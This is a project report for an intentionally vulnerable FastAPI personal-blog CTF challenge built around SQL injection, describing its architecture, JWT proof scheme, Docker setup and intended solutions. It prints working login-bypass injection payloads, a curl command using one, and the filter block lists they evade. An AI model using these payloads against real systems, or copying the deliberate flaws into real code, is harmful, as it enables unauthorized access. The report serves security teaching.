# Personal Blog CTF - Project Report

## Executive Summary

The **Personal Blog CTF** is a deliberately vulnerable web application designed as an educational Capture The Flag (CTF) challenge focused on SQL injection vulnerabilities. This project serves as a teaching artifact to demonstrate how security vulnerabilities can arise from third-party dependency behavior rather than flawed application logic. It is explicitly designed for educational purposes and should **not** be used as a production system or security reference.

---

## 1. Project Overview

### 1.1 Purpose and Scope

This project is a self-contained, teaching-oriented SQL injection CTF service built around a simplified personal blog application. The primary educational objective is to illustrate how:

- Security failures can emerge from dependency behavior
- Application-level business logic may appear clean while still being vulnerable
- Partial validation creates exploitable security gaps
- Frontend restrictions do not provide real protection

### 1.2 Target Audience

- CTF players and security enthusiasts
- Security learners and educators
- Challenge authors and security researchers

**Note:** This project is **not intended** for production deployment or best-practice reference.

---

## 2. Technical Architecture

### 2.1 Technology Stack

| Component | Technology | Version |
|-----------|-----------|---------|
| **Runtime** | Python | 3.11+ |
| **Web Framework** | FastAPI | Latest |
| **ASGI Server** | Uvicorn | - |
| **Database** | MariaDB | - |
| **Database Driver** | PyMySQL | - |
| **Authentication** | JWT (PyJWT) | - |
| **Containerization** | Docker | - |

### 2.2 System Architecture

```
┌─────────────┐
│   Browser   │
└──────┬──────┘
       │ HTTP/HTTPS
       ▼
┌─────────────────────────────────────┐
│         FastAPI Application         │
│  ┌───────────────────────────────┐  │
│  │   API Endpoints (REST)        │  │
│  │   - /api/home                 │  │
│  │   - /api/login/user           │  │
│  │   - /api/login/admin          │  │
│  │   - /api/user/{username}      │  │
│  └───────────────────────────────┘  │
│  ┌───────────────────────────────┐  │
│  │   Frontend (HTML/JS/CSS)      │  │
│  │   - index.html                │  │
│  │   - personal_space.html       │  │
│  │   - admin.html                │  │
│  └───────────────────────────────┘  │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│     ctf_sql.MySql (CTF Backend)     │
│     - Injected Vulnerability        │
│     - Partial Sanitization          │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│          MariaDB Database           │
│   - users, admins, posts, comments  │
│   - ctf_progress (flags)            │
└─────────────────────────────────────┘
```

### 2.3 Key Design Characteristics

- **Single-origin deployment**: Frontend and backend run on the same host and port
- **Container-first model**: Fully initialized, ready-to-run CTF instance in Docker
- **CTF mode enforcement**: Hard-coded at startup, no runtime switching
- **Dependency-layer vulnerability**: SQL injection introduced at the database driver layer
- **Clean business logic**: Application code remains readable and uncluttered

---

## 3. Core Functionality

### 3.1 User Features

1. **Homepage (`/`)**
   - Displays published blog posts
   - Shows author information including emails (intentional information disclosure)
   - Lists post metadata (title, creation date, comment count)

2. **User Login (`/api/login/user`)**
   - Email and password authentication
   - JWT token generation upon successful login
   - Vulnerable to SQL injection via email parameter

3. **Personal Space (`/personal_space`)**
   - Displays user's private posts
   - Requires valid JWT token
   - User-specific content retrieval

### 3.2 Admin Features

1. **Admin Login Page (`ADMIN_LOGIN_URL`, default `/admin456_login`)**
   - Frontend page displaying admin login form
   - Hidden URL (configurable via `ADMIN_LOGIN_URL` environment variable)

2. **Admin Login API (`POST /api/login/admin`)**
   - Username and password authentication
   - Separate JWT token generation
   - Vulnerable to SQL injection via username parameter

3. **Admin Panel (`ADMIN_URL`, default `/admin123`)**
   - Admin-only interface
   - CTF flag submission
   - Hidden URLs (configurable via `ADMIN_URL` environment variable)

### 3.3 CTF-Specific Features

1. **CTF Progress Tracking**
   - Two flags: user flag and admin flag
   - Progress stored in `ctf_progress` table
   - Status queryable via `/api/flags`

2. **Flag Submission**
   - `/api/user/answer/{jwt}`: Submit user flag
   - `/api/admin/answer/{jwt}`: Submit admin flag
   - Requires valid JWT tokens

---

## 4. Security Model (Deliberately Non-Secure)

### 4.1 Intentional Vulnerabilities

This project **intentionally violates** real-world security practices:

1. **SQL Injection Vulnerabilities**
   - User login: Email parameter vulnerable to SQL injection
   - Admin login: Username parameter vulnerable to SQL injection
   - Based on CVE-2019-12989-inspired vulnerability pattern

2. **Weak Authentication**
   - Simplified JWT implementation
   - Custom proof mechanism (not cryptographically strong)
   - Mock password hashes (not real SHA-256 outputs)

3. **Information Disclosure**
   - Email addresses exposed in `/api/home` response
   - Weak token proof logic
   - Open CORS configuration

4. **Partial Sanitization**
   - Regex-based filtering attempts
   - Designed to block trivial payloads while preserving exploit paths
   - Not actual security features, but challenge shaping mechanisms

### 4.2 Vulnerability Design

#### User Login SQL Injection

**Sanitization Rules:**
- Blocks: `OR`, `=`, `>`, `<`, `LIKE`, `IN`, `BETWEEN`, `TRUE`, `FALSE`, `--`, `|`, `'#`, ` #`
- Blocks direct patterns: `AND 1`, `(1)`
- **Intended exploit pattern**: `alice@example.com' AND ('1')#`

**Query Construction:**
```sql
SELECT id, username, email
FROM users
WHERE email = %s AND password_hash = %s
```

#### Admin Login SQL Injection

**Sanitization Rules:**
- Blocks: `OR`, `=`, `>`, `<`, `LIKE`, `IN`, `BETWEEN`, `TRUE`, `FALSE`, `--`, `AND`, `'#`, ` #`
- Requires: At least 5 Latin letters before the first quote (or no quote)
- Blocks: `|| 1`, `(1)`
- **Intended exploit pattern**: `{at least 5 latins}' || ('1')#`

**Query Construction:**
```sql
SELECT id FROM admins
WHERE username = %s AND password_hash = %s
```

### 4.3 Dependency-Layer Vulnerability Injection

The SQL injection vulnerability is injected at the database connection layer:

```python
def get_conn(sanitizer: Optional[Callable[[str], str]] = None):
    if ctf_sql.SESSION_NAME == ctf_sql.constants.CTF_SESSION_NAME:
        return ctf_sql.MySql.connect(
            host=ctf_sql.DB_HOST,
            user=ctf_sql.DB_USER,
            passwd=ctf_sql.DB_PASS,
            db=ctf_sql.DB_NAME,
            sanitizer=sanitizer,
        )
```

This design ensures:
- Business logic remains clean and readable
- No SQL string manipulation in application code
- Vulnerability behavior is injected only at connection time
- Easy to audit and reason about application logic

---

## 5. Authentication and Authorization

### 5.1 JWT Implementation

#### User Tokens

**Token Structure:**
```json
{
  "role": "user",
  "username": "string",
  "email": "string",
  "login_ts": timestamp,
  "proof": "4-character hex",
  "exp": expiration_timestamp
}
```

**Proof Generation:**
```python
base = f"{username}{USER_MID_1}{email}{USER_MID_2}{ts}"
h = hashlib.sha256(base.encode()).hexdigest()
num = int(h, 16) + ADD_NUM
proof = hex(num)[2:].upper()[-4:]
```

#### Admin Tokens

**Token Structure:**
```json
{
  "role": "admin",
  "username": "string",
  "login_ts": timestamp,
  "proof": "4-character hex",
  "exp": expiration_timestamp
}
```

**Proof Generation:**
```python
base = f"{username}{ADMIN_MID_1}{ADMIN_MID_2}{ts}"
h = hashlib.sha256(base.encode()).hexdigest()
num = int(h, 16) + ADD_NUM
proof = hex(num)[2:].upper()[-4:]
```

### 5.2 Token Verification

- JWT signature validation using separate secrets for users and admins
- Role-based access control
- Username binding (for user tokens)
- Proof validation against expected value
- Expiration checking

---

## 6. Database Schema

### 6.1 Core Tables

#### `users`
- `id`: Primary key
- `username`: Unique identifier
- `email`: Unique email address
- `password_hash`: SHA-256 hash (intentionally invalid for CTF)
- `created_at`: Timestamp

#### `admins`
- `id`: Primary key
- `username`: Unique identifier
- `password_hash`: SHA-256 hash (intentionally invalid for CTF)
- `created_at`: Timestamp

#### `posts`
- `id`: Primary key
- `title`: Post title
- `content`: Post content
- `author_id`: Foreign key to `users.id`
- `category_id`: Foreign key to `categories.id` (optional)
- `created_at`: Timestamp
- `is_published`: Boolean flag

#### `comments`
- `id`: Primary key
- `post_id`: Foreign key to `posts.id`
- `user_id`: Foreign key to `users.id`
- `content`: Comment text
- `created_at`: Timestamp

#### `ctf_progress`
- `id`: Primary key
- `user_pwned`: Boolean flag for user flag
- `admin_pwned`: Boolean flag for admin flag

---

## 7. Deployment Model

### 7.1 Docker-Based Deployment

The project follows a **CTF-first, container-first model**:

1. **Build Phase**
   - Starts MariaDB internally
   - Bootstraps users and databases
   - Inserts CTF data
   - Resets flags
   - Shuts down database
   - Freezes database state into image

2. **Runtime Phase**
   - Database state is pre-initialized
   - No runtime database provisioning
   - Configuration frozen at build time
   - Runtime configuration limited to secrets and routing

### 7.2 Environment Variables

#### Runtime-Configurable Variables

These may be overridden at container startup:

| Variable | Purpose | Default |
|----------|---------|---------|
| `JWT_SECRET_USER` | User JWT signing secret | `dev-secret-for-ctf-user` |
| `JWT_SECRET_ADMIN` | Admin JWT signing secret | `dev-secret-for-ctf-admin` |
| `JWT_ALGO` | JWT algorithm | `HS256` |
| `JWT_EXPIRE_SECONDS` | Token expiration time | `3600` |
| `USER_MID_1`, `USER_MID_2` | User proof generation salts | Various |
| `ADMIN_MID_1`, `ADMIN_MID_2` | Admin proof generation salts | Various |
| `ADD_NUM` | Proof generation offset | `0xEEE7` |
| `ADMIN_URL` | Admin panel URL path | `/admin123` |
| `ADMIN_LOGIN_URL` | Admin login URL path | `/admin456_login` |

#### Build-Time Only Variables

These **must NOT** be overridden at runtime (used during Docker build):

- `DB_HOST`, `DB_USER`, `DB_PASS`, `DB_NAME`
- `CTF_DB_HOST`, `CTF_DB_USER`, `CTF_DB_PASS`, `CTF_DB_NAME`

### 7.3 Deployment Commands

**Build:**
```bash
docker build -t personal-blog-ctf .
```

**Run:**
```bash
docker run -p 8000:8000 \
  -e JWT_SECRET_USER=example_user_secret \
  -e JWT_SECRET_ADMIN=example_admin_secret \
  -e ADMIN_URL=/admin_hidden \
  -e ADMIN_LOGIN_URL=/login_hidden \
  personal-blog-ctf
```

**Access:**
```
http://localhost:8000
```

---

## 8. CTF Challenge Design

### 8.1 Challenge Objectives

1. **User Flag Challenge**
   - Discover email address from `/api/home`
   - Exploit SQL injection in user login
   - Obtain valid JWT token
   - Submit flag via `/api/user/answer/{jwt}`

2. **Admin Flag Challenge**
   - Locate admin login endpoint (hidden URL)
   - Exploit SQL injection in admin login
   - Obtain valid admin JWT token
   - Submit flag via `/api/admin/answer/{jwt}`

### 8.2 Exploitation Paths

#### User Login Exploitation

**Step 1:** Extract email from `/api/home`
```json
GET /api/home
Response: { ..., "email": "alice@example.com", ... }
```

**Step 2:** Construct SQL injection payload
```bash
email = "alice@example.com' AND ('1')#"
password = "anything"
```

**Step 3:** Submit login request
```bash
curl -X POST http://127.0.0.1:8000/api/login/user \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "email=alice@example.com' AND ('1')#" \
  --data-urlencode "password=anything"
```

**Step 4:** Extract JWT and submit flag
```bash
POST /api/user/answer/{jwt}
```

#### Admin Login Exploitation

**Step 1:** Discover admin login page URL (hidden, configurable)
```
GET /admin456_login  (default, or custom ADMIN_LOGIN_URL)
```

**Step 2:** Construct SQL injection payload
```
username = "admin' || ('1')#"
password = "anything"
```

**Note:** Must have at least 5 Latin letters before the quote.

**Step 3:** Submit login request to API and obtain admin JWT
```
POST /api/login/admin
Content-Type: application/x-www-form-urlencoded

username=admin' || ('1')#&password=anything
```

**Step 4:** Submit admin flag
```bash
POST /api/admin/answer/{jwt}
```

### 8.3 Educational Focus

This CTF teaches:
- How to identify SQL injection vulnerabilities
- Understanding of partial sanitization bypasses
- JWT token manipulation and validation
- Information gathering from exposed APIs
- Dependency-level security considerations

---

## 9. Code Structure

### 9.1 Directory Layout

```
Personal-Blog-CTF/
├── app/                      # Main application code
│   ├── __init__.py
│   ├── main.py              # FastAPI application and routes
│   ├── config.py            # Configuration management
│   ├── jwt_plugin.py        # JWT generation and verification
│   └── properties.py        # Environment variable handling
├── frontend/                # Frontend HTML files
│   ├── index.html           # Homepage
│   ├── personal_space.html  # User personal page
│   ├── admin.html           # Admin panel
│   └── admin_login.html     # Admin login page
├── static/                  # Static assets
│   ├── app.js              # Frontend JavaScript
│   └── style.css           # Stylesheet
├── scripts/                 # Database scripts
│   ├── db_bootstrap.py     # Database initialization
│   ├── init_prod.sql       # Production schema
│   ├── reset_ctf.sql       # CTF data reset
│   └── run_*.py            # Script runners
├── docker_scripts/          # Docker-related scripts
│   ├── bootstrap_db.sh     # Build-time DB setup
│   └── docker-entrypoint.sh # Runtime entrypoint
├── Dockerfile              # Docker image definition
├── pyproject.toml          # Python dependencies
└── README.md               # Project documentation
```

### 9.2 Key Modules

#### `app/main.py`
- FastAPI application initialization
- Route handlers for all endpoints
- SQL injection sanitization functions
- Database connection management
- JWT verification logic

#### `app/jwt_plugin.py`
- JWT token generation (user and admin)
- JWT verification and validation
- Proof mechanism implementation

#### `app/config.py`
- Configuration JSON generation
- URL path configuration
- Runtime configuration dumping

#### `app/properties.py`
- Environment variable parsing
- Default value management
- Configuration constants

---

## 10. Testing and Validation

### 10.1 CTF Mode Enforcement

CTF mode is hard-coded at application startup:

```python
import builtins
builtins.CTF_MODE = "ctf"
```

This ensures:
- No dependency on environment variables
- No accidental fallback to production behavior
- Deterministic SQL execution semantics
- Reproducible exploitation paths

### 10.2 Flag Verification

Flags are verified through:
1. JWT token validation
2. Username binding (for user flag)
3. Database state updates
4. Progress tracking in `ctf_progress` table

### 10.3 Challenge Validation

**User Challenge:**
- Must use leaked email from `/api/home`
- Must exploit SQL injection (not password guessing)
- Must obtain valid JWT with correct username

**Admin Challenge:**
- Must discover hidden admin URLs
- Must exploit SQL injection with specific constraints
- Must obtain valid admin JWT

---

## 11. Security Considerations

### 11.1 Explicit Non-Security Design

This project **intentionally violates** security best practices:

- ❌ No input validation (beyond CTF challenge shaping)
- ❌ SQL injection vulnerabilities enabled
- ❌ Weak authentication mechanisms
- ❌ Information disclosure
- ❌ Open CORS configuration
- ❌ Simplified JWT implementation

**These choices are deliberate for educational purposes.**

### 11.2 Educational Security Lessons

Despite being intentionally vulnerable, this project demonstrates:

1. **Dependency Security**
   - Vulnerabilities can arise from third-party libraries
   - Application logic may be clean while dependencies are not
   - Security auditing must include dependency review

2. **Partial Validation**
   - Incomplete sanitization creates exploitable gaps
   - Regex-based filters can often be bypassed
   - Defense-in-depth is essential

3. **Information Disclosure**
   - Exposed data can aid attackers
   - Principle of least information should be followed
   - Sensitive data should not be exposed unnecessarily

4. **Token Security**
   - JWT tokens require proper validation
   - Proof mechanisms should be cryptographically strong
   - Token binding prevents misuse

---

## 12. Limitations and Known Issues

### 12.1 Design Limitations

1. **Single-user mode**: Global user state (no concurrency consideration)
2. **Mock password hashes**: Intentionally invalid to force SQL injection path
3. **No production mode**: CTF mode only, cannot be secured for production
4. **Simplified JWT**: Proof mechanism is not cryptographically strong

### 12.2 Known Constraints

1. **Frontend restrictions**: Some JavaScript payloads may be blocked, requiring direct API interaction
2. **Regex-based sanitization**: May have edge cases not covered
3. **Fixed database state**: Docker image has frozen database state
4. **No runtime configuration**: Database credentials cannot be changed at runtime

---

## 13. Future Enhancements (Potential)

While this is a CTF project with specific educational goals, potential enhancements could include:

1. **Additional vulnerability types**: XSS, CSRF, command injection
2. **Multi-level CTF challenges**: Progressive difficulty levels
3. **Automated flag verification**: More sophisticated validation
4. **Challenge hints system**: Gradual hint disclosure
5. **Scoring mechanism**: Points-based scoring for CTF competitions

**Note:** These would require careful consideration to maintain educational value.

---

## 14. Conclusion

The Personal Blog CTF project serves as an effective educational tool for teaching SQL injection vulnerabilities and dependency-level security issues. By demonstrating how clean application logic can still be vulnerable due to dependency behavior, it provides valuable lessons for security learners and CTF participants.

The container-first, CTF-enforced design ensures reproducible challenges while maintaining clean, readable code. The intentional vulnerabilities and partial sanitization mechanisms create realistic exploitation scenarios that require understanding of both application logic and dependency behavior.

**This project should be studied as a teaching artifact, not used as a security reference or production system.**

---

## 15. References

- **CVE-2019-12989**: Inspiration for SQL injection vulnerability pattern
- **FastAPI Documentation**: https://fastapi.tiangolo.com/
- **JWT Specification**: RFC 7519
- **OWASP Top 10**: SQL Injection vulnerability category
- **CTF Best Practices**: Educational security challenge design

---

**Report Generated:** 2024  
**Project Version:** 0.1.0  
**Python Version:** 3.11+  
**License:** Educational/CTF Use Only
